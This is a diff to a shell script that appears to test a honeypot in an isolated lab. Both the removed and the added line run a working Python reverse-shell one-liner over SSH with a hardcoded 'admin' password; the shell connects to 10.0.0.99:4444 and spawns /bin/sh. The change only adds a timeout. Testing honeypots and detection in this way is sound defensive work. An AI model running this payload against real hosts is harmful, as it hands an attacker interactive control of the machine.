@@ -7,4 +7,4 @@
 TARGET="${1:-safe-honeypot}"
 SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
 echo "=== S26 Python Reverse Shell Attempt — ${TARGET} ==="
-$SSH "python3 -c \"import socket,os,pty;s=socket.socket();s.settimeout(3);s.connect(('10.0.0.99',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\" 2>&1 || echo 'connection failed (expected in isolated lab)'" && echo "[OK]" || echo "[FAIL]"
+timeout ${TIMEOUT:-45} $SSH "python3 -c \"import socket,os,pty;s=socket.socket();s.settimeout(3);s.connect(('10.0.0.99',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\" 2>&1 || echo 'connection failed (expected in isolated lab)'" && echo "[OK]" || echo "[FAIL]"
